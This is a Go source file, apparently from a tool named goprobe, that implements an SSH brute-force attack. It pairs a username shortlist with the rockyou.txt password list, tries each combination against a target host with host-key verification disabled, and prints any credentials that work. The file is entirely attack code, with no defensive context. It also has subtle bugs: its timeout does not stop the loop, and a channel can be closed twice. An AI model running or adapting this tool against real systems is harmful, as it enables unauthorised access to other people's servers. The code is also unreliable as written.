package attackSSH

import (
	"os"
	"golang.org/x/crypto/ssh"
	"time"
	"fmt"
	"bufio"
	"sync"

	"github.com/jacobmaniscalco/goprobe/internal/attack"
)

func readFile(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err 
	}
	defer file.Close()

	var lines []string

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return lines, nil 
}

func connectSSH(options attack.AttackOptions, username string, password string, successChan chan <- string) {
	//defer wg.Done()
	config := &ssh.ClientConfig {
		User : username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		}, 
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), 
		Timeout: 5 * time.Second,
	}
	client, err := ssh.Dial("tcp", options.Host + ":" + options.Port, config)
	if err == nil {
		successChan <- fmt.Sprintf("Success: %s:%s", username, password)
		client.Close()
	}
}

func BruteForceSSH(options attack.AttackOptions) error {

	var wg sync.WaitGroup 
	successChan := make(chan string, 1)
	done := make(chan struct{})
	maxConcurrent := 5
	semaphore := make(chan struct{}, maxConcurrent)

	timeout := time.After(10 * time.Second)

	start := time.Now()

	var attempts int

	go func() {
		select {
		case success := <-successChan:
			fmt.Println(success)
			close(done)
		case <-done:
			return
		}
	}()
	
	usernames, err := readFile("internal//utils/top-usernames-shortlist.txt")
	if err != nil {
		return err
	}

	passwords, err := readFile("internal/utils/rockyou.txt")
	if err != nil {
		return err
	}

	for _, user := range usernames {
		for _, pass := range passwords {

		select {
		case <- timeout:
			fmt.Println("attempts:", attempts)
			break 
		default:
			attempts++
		}
		
			wg.Add(1)
			semaphore <- struct{}{}

			go func(user, pass string) {
				defer wg.Done()
				connectSSH(options, user, pass, successChan)

				<-semaphore
			}(user, pass)
		}
	}

	go func() {
		wg.Wait()
		close(done)
	}()

	<-done

	elapsed := time.Since(start)
	combinationsPerSecond := float64(attempts) / elapsed.Seconds()
	fmt.Println("combos per second: ", combinationsPerSecond)
	return nil
}
